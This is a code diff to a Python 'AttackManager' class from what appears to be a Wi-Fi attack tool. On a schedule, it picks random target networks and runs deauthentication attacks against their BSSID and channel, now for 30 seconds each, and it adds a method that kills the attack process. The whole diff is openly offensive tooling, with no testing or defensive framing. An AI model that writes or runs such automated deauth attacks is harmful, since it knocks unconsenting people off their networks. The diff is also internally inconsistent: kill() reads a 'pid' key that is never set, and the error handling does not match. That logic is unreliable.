@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 import importlib
-# import os
-# import signal
+import os
+import signal
 import sys
 import time
 import traceback
@@ -55,11 +55,20 @@ class AttackManager(object):
                 bssid
             ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=False)
 
-            self.config.set(ATK_PID=process.pid)
+            self.config.set(ATK_PID=process.pid, ATK_BSSID=bssid)
             return process
-
         except RuntimeError:
-            raise RuntimeError
+            return False
+
+    def kill(self):
+        try:
+            pid = self.config.get('pid')
+            os.kill(pid, signal.SIGKILL)
+            self.config.set(pid=None)
+            return True
+        except ValueError:
+            print('No pid found!')
+            return False
 
     def cron_atk(self):
         if self.config.get('MAIN_STATUS') is False:
@@ -70,15 +79,17 @@ class AttackManager(object):
 
         target = self.random_target()
         process = self.deauth(target.bssid, target.channel)
-        time.sleep(20)
+        time.sleep(30)
 
         try:
             process.kill()
+            return True
         except RuntimeError:
             print('\n', '>>>' * 20)
             print(traceback.print_exc())
             print('\n', '>>>' * 20)
             print(traceback.format_exc())
+            return False
 
     @staticmethod
     def random_target():
